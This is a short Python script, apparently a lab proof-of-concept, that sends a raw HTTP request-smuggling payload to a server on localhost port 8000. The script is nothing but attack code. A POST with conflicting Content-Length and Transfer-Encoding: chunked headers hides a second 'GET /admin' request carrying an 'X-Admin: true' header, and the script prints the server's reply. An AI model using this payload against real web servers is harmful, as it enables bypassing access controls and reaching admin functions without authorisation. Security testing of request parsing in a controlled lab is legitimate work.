import socket

HOST = "127.0.0.1"
PORT = 8000
TIMEOUT_SECS = 2

payload = (
    "POST /submit HTTP/1.1\r\n"
    "Host: test\r\n"
    "Content-Length: 13\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin HTTP/1.1\r\n"
    "Host: test\r\n"
    "X-Admin: true\r\n"
    "\r\n"
)

with socket.create_connection((HOST, PORT), timeout=TIMEOUT_SECS) as s:
    s.sendall(payload.encode())
    s.shutdown(socket.SHUT_WR)
    chunks = []
    while True:
        try:
            data = s.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)

    response = b"".join(chunks)
    print(response.decode(errors="ignore"))
